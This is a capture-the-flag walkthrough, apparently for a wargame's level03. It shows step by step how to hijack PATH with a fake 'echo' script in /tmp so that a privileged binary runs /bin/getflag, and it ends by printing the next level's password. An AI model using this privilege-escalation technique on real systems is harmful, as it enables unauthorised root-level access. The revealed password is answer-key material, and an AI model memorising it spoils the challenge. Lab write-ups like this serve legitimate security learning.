In this level we find a file level03, doing `ls -la` we can see tha only its owner (level03) can execute that file as file03.

So lets execute it:

```jsx
./level03
```

We get the message `Exploit me` 

This string must be in the file so we will use the command `strings` to find it:

```jsx
strings level03 | grep "Exploit me"
```

We get this line:

```bash
/usr/bin/env echo Exploit me
```

We see the file use the binary `user/bin/env echo` to print “Exploit me” so we will exploit it.

We will create a file named `echo` and this file will execute `/bin/getflag` 

As usually we will create it in `/tmp` folder due to permission restriction

```bash
cd /tmp
echo "/bin/getflag" > echo
chmod 777 echo
```

Now let’s export this path so it is called first (adding it to the beginning of the old one)

```bash
export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```

Now let’s go back to the main folder and exploit the file:

```bash
cd
./level03
```

And there we go, we get the next token so lets find the flag

```bash
su level04
password qi0maab88jeaj46qoumi7maus
```